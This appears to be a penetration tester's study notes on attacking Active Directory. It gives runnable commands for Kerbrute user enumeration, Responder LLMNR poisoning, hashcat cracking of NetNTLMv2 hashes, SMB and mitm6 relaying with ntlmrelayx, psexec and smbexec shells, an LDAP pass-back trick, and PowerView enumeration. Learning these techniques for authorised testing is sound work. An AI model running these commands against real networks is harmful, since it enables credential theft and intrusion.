<h1> Kerbrute </h1><br>
Only do usernames as to not lockout users <br>
Located in my downloads <br>
./kerbrute_linux_amd64 userenum -d spookysec.local --dc 10.10.103.225 users.txt <br>

<h1>LLMNR Poisoning</h1><br>
fallback with share that is unknown, device reaches out with broadcast to see if any device knows the share, malicious machine asks for hash to direct user <br>
<br>
Responder is used to capture the hashes (type locate responder to find the path) - python3 responder.py -I eth0 -rdwv <br>
Run tool first thing in morning on a pen test and right after lunch <br>
<br>
Next you'll want to crack the hashes - Hashcat runs better on normal PC and not VM due to using GPU. Copy whole hash, add to text file.
<br>
hashcat -m 5600 file.txt rockyou.txt --force ------  -m 5600 stands for AD hash NetNTLMv2 <br>
<br>
<h1>SMB Relay</h1><br>
Instead of cracking hashes from responder, can relay hashes to another machine. SMB signing has to be disabled on the target and relayed creds must be admin on machine.<br>
<b> to work have to go to responder.conf and turn off SMB and HTTP</b> <br>
Run Responder.py and also now configure ntlmrelayx.py (locate ntlmrelay) python3 ntlmrelayx.py -tf targets.txt -smb2support <br>
<br>
Can gain shell access with pw - run psexec (metasploit module) - need domain, user and pass, may need to try the module several times <br>
Could also use - sudo python3 smbexec.py domain/username:'password'@IP <br>
Or psexec.py domain/username:password@IP <br>
<br>
<h1>Pass Back Attack </h1> <br>
This is an LDAP attack (anything that uses LDAP to connect to AD such as printers) <br>
on LDAP server address within the settings configuration if you change the IP address of the LDAP server to your machine and setup a listerner (responder or netcat) the password will be sent over in cleartext
<br>
<br>

<h1> MITM6 </h1> <br>
github.com/got-it/mitm6 <br>
mitm6 -I eth0 -d domain.local <br>
Now setup relay attack with ntlmrelayx - ntlmrelayx.py -6 -t ldaps://domainip -wh fakewpad.domain.local -l lootme <br>

<h1>Further strats </h1><br>
Look for web portals that may have default creds, anything on there that shows AD creds? <br>
Check GPO's or hardcoded creds within XML files etc <br>
Look on printers <br>

<h1> Post exploitation <h1><br>
  <h2> Domain Enumeration with Powershell </h2> <br>
  . .\PowerView.ps1 (enter) <br>
  Get-NetDomain (enter)<br>
  Get-DomainPolicy<br>
  Get-NetUser (sometimes passwords are placed in Description) -- Get-NetUser | select description<br>
  




